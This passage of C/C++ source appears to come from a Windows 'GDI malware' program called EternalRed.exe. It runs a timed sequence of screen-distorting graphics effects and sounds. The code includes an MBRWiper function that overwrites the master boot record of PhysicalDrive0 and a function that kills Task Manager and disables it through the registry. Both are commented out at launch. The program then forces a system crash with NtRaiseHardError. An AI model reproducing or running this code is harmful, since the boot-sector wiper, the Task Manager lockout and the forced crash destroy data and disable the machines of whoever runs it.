	PlgBlt(deskMem, wPt, upHdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	BitBlt(upHdc, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
	Sleep(10);
	if (xorshift32() % 10 == 5) InvalidateRect(0, 0, 0);
	Sleep(125);
}
VOID gdi14_waterfall2(int counter)
{
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC desktop = GetDC(NULL);
	upWnd = GetForegroundWindow();
	upHdc = GetDC(upWnd);
	desktop = GetDC(NULL);
	SeedXorshift32(__rdtsc());
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	HDC deskMem = CreateCompatibleDC(desk);
	HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(deskMem, screenshot);
	GetWindowRect(GetDesktopWindow(), &wRect);
	wPt[0].x = wRect.left - counter;
	wPt[0].y = wRect.top + counter;
	wPt[1].x = wRect.right - counter;
	wPt[1].y = wRect.top - counter;
	wPt[2].x = wRect.left + counter;
	wPt[2].y = wRect.bottom + counter;
	PlgBlt(deskMem, wPt, upHdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);;
	BitBlt(upHdc, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
	Sleep(10);
	if (xorshift32() % 10 == 5) InvalidateRect(0, 0, 0);
	Sleep(125);
}
DWORD WINAPI gdi14(LPVOID lpParam)
{
	while (1)
	{
		gdi14_waterfall1(10);
		gdi14_waterfall2(10);
		gdi14_waterfall2(10);
		gdi14_waterfall1(10);
	}
}

DWORD WINAPI gdi15(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
	while (1)
	{
		hdc = GetDC(0);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
		BitBlt(hdc, -20, 0, x, y, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, x - 20, 0, x, y, hdc, 0, 0, PATCOPY);
		Sleep(5);
	}
}

//payload12

DWORD WINAPI gdi16(LPVOID lpParam)
{
	int uVar1;
	int uVar2;
	int uVar3;
	int uVar4;
	uint uVar5;
	uint uVar6;
	HDC hdc;
	uint uVar7;
	uint uVar8;

	uVar5 = GetSystemMetrics(0);
	uVar6 = GetSystemMetrics(1);
	hdc = GetDC((HWND)0x0);
	do
	{
		uVar1 = rdtsc();
		uVar2 = rdtsc();
		uVar3 = rdtsc();
		uVar7 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
		uVar7 = uVar7 ^ uVar7 << 0x11;
		uVar3 = rdtsc();
		uVar8 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
		uVar8 = uVar8 ^ uVar8 << 0x11;
		uVar3 = rdtsc();
		uVar4 = rdtsc();
		BitBlt(hdc, (uint)uVar4 & rand() % 5, (uint)uVar3 & rand() % 5, (uVar8 << 10 ^ uVar8) % uVar5, (uVar7 << 10 ^ uVar7) % uVar6, hdc, (uint)uVar2 & rand() % 5, (uint)uVar1 & rand() % 5, SRCCOPY);
	} while (true);
}

DWORD WINAPI gdi17(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.top - 500, h = rect.bottom - rect.top - 500;
		const int size = 3000;
		int x = xorshift32() % (w + size) - size / 2, y = xorshift32() % (h + size) - size / 2;
		for (int i = 0; i < size; i += 600)
		{
			gdi17_sab(x - i / 2, y - i / 2, i, i);
		}
		RedrawWindow(0, 0, 0, 133);
		Sleep(1750);
	}
}
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}
DWORD WINAPI DisableTaskManager(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	return 1;
}
int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
	//WARNING

	if (MessageBoxW(NULL, L"Run GDI Only?", L"EternalRed.exe - !!!WARNING!!! ", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;

	if (MessageBoxW(NULL, L"Are you sure?", L"EternalRed.exe - !!!FINAL WARNING!!!", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;
	//Default GDI

	CreateThread(0, 0, garbled, 0, 0, 0);
	//CreateThread(0, 0, DisableTaskManager, 0, 0, 0);
	//CreateThread(0, 0, MBRWiper, 0, 0, 0);
	HANDLE thread0000 = CreateThread(0, 0, mouse, 0, 0, 0);
	Sleep(2500);
	//GDI payload
	HANDLE thread1 = CreateThread(0, 0, gdi1, 0, 0, 0);
	Sleep(5000);
	sound1();
	Sleep(5000);
	HANDLE thread1_1 = CreateThread(0, 0, gdi2, 0, 0, 0);
	Sleep(10000);
	TerminateThread(thread1, 0);
	CloseHandle(thread1);
	TerminateThread(thread1_1, 0);
	CloseHandle(thread1_1);
	RedrawWindow(0, 0, 0, 133);
	sound2();
	HANDLE thread2 = CreateThread(0, 0, gdi3, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread2, 0);
	CloseHandle(thread2);
	RedrawWindow(0, 0, 0, 133);
	sound3();
	HANDLE thread3 = CreateThread(0, 0, gdi4, 0, 0, 0);
	Sleep(15000);
	HANDLE thread3_1 = CreateThread(0, 0, gdi5, 0, 0, 0);
	Sleep(5000);
	TerminateThread(thread3, 0);
	CloseHandle(thread3);
	TerminateThread(thread3_1, 0);
	CloseHandle(thread3_1);
	RedrawWindow(0, 0, 0, 133);
	sound4();
	HANDLE thread4 = CreateThread(0, 0, gdi6, 0, 0, 0);
	HANDLE thread4_1 = CreateThread(0, 0, clipping, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread4, 0);
	CloseHandle(thread4);
	RedrawWindow(0, 0, 0, 133);
	sound5();
	HANDLE thread5 = CreateThread(0, 0, gdi7, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread4_1, 0);
	CloseHandle(thread4_1);
	TerminateThread(thread5, 0);
	CloseHandle(thread5);
	RedrawWindow(0, 0, 0, 133);
	sound6();
	HANDLE thread6 = CreateThread(0, 0, gdi8, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread6, 0);
	CloseHandle(thread6);
	RedrawWindow(0, 0, 0, 133);
	sound7();
	HANDLE thread7 = CreateThread(0, 0, gdi9, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread7, 0);
	CloseHandle(thread7);
	RedrawWindow(0, 0, 0, 133);
	sound8();
	HANDLE thread8 = CreateThread(0, 0, gdi10, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread8, 0);
	CloseHandle(thread8);
	RedrawWindow(0, 0, 0, 133);
	sound9();
	HANDLE thread9 = CreateThread(0, 0, gdi11, 0, 0, 0);
	Sleep(10000);
	TerminateThread(thread9, 0);
	CloseHandle(thread9);
	RedrawWindow(0, 0, 0, 133);
	HANDLE thread10 = CreateThread(0, 0, gdi12, 0, 0, 0);
	HANDLE thread10_1 = CreateThread(0, 0, gdi13, 0, 0, 0);
	Sleep(10000);
	TerminateThread(thread10, 0);
	CloseHandle(thread10);
	TerminateThread(thread10_1, 0);
	CloseHandle(thread10_1);
	RedrawWindow(0, 0, 0, 133);
	sound10();
	HANDLE thread11 = CreateThread(0, 0, gdi14, 0, 0, 0);
	HANDLE thread11_1 = CreateThread(0, 0, gdi15, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread11, 0);
	CloseHandle(thread11);
	TerminateThread(thread11_1, 0);
	CloseHandle(thread11_1);
	RedrawWindow(0, 0, 0, 133);
	sound11();
	HANDLE thread12 = CreateThread(0, 0, gdi16, 0, 0, 0);
	HANDLE thread12_1 = CreateThread(0, 0, gdi17, 0, 0, 0);
	HANDLE thread12_2 = CreateThread(0, 0, mouse2, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread12, 0);
	CloseHandle(thread12);
	TerminateThread(thread12_1, 0);
	CloseHandle(thread12_1);
	RedrawWindow(0, 0, 0, 133);
	BOOLEAN bl;
	DWORD response;
	NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
	RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
	RtlAdjustPrivilege(19, 1, 0, &bl);
	NtRaiseHardError(0xC0000194, 0, 0, 0, 6, &response);
	Sleep(-1);
}